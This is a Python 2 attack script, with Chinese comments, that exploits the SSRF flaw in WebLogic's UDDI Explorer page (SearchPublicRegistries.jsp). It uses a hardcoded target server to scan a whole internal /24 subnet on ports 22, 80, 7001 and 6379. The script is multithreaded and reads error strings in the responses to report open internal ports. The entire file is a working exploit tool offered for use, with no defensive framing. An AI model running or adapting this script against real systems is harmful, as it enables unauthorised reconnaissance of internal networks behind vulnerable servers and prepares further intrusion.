#!/usr/bin/env python  
# -*- coding: utf-8 -*-
#author:Jyanger change


import re
import sys
import time
import threading
import requests
import Queue
lock = threading.Lock()
threads = []

class MyThread(threading.Thread):
    def __init__(self,queue):
        threading.Thread.__init__(self)
        self.queue = queue
    def run(self):
        while True:  # 除非确认队列中已经无任务，否则时刻保持线程在运行
            try:
                ip_str = self.queue.get(block=False)    # 如果队列空了，直接结束线程。根据具体场景不同可能不合理，可以修改
                scan(ip_str)
            except Exception,e:
                break
  
def scan(ip_str):
  #ports = ('21','22','23','53','80','135','139','443','445','1080','1433','1521','3306','3389','4899','8080','7001','8000','6379')
  ports = ('22','80','7001','6379')
  for port in ports:
    exp_url = "http://192.168.187.144:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://%s:%s&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"%(ip_str,port)
    #print '[-] '+ip_str+':'+port
    try:
      response = requests.get(exp_url, timeout=3, verify=False)
      #SSRF判断
      re_sult1 = re.findall('weblogic.uddi.client.structures.exception.XML_SoapException',response.content)
      #丢失连接.端口连接不上
      re_sult2 = re.findall('but could not connect',response.content)
      #丢失连接.端口连接不上
      re_sult3 = re.findall('No route to host',response.content)
      #没有路由的主机，扫描不存在
      if (len(re_sult1)!=0 and (len(re_sult2)+len(re_sult3))==0):
        lock.acquire()
        print '[+] '+ip_str+':'+port
        lock.release()
    except Exception, e:
      pass
def find_ip(ip_prefix,Thread_count):
  '''
  给出当前的192.168.1 ，然后扫描整个段所有地址
  '''
  thread_count = int(Thread_count)
  queue = Queue.Queue()
  print '[*]---------------------------------------'
  print '[*]please wait for scan'
  for i in range(1,256):
    ip = '%s.%s'%(ip_prefix,i)
    queue.put(ip)
  for i in range(thread_count):
    threads.append(MyThread(queue))
  for t in threads:
    try:
      t.start()
    except Exception as e:
      print e
      continue
  for t in threads:
    try:
      t.join()
    except Exception as e:
      print e
      continue
  print '[*] scan end! bey'
if __name__ == "__main__":
  commandargs = sys.argv[1:]
  args = "".join(commandargs)
  ip_prefix = '.'.join(args.split('.')[:-1])
  print ip_prefix
  thread_count = sys.argv[2]
  find_ip(ip_prefix,thread_count)
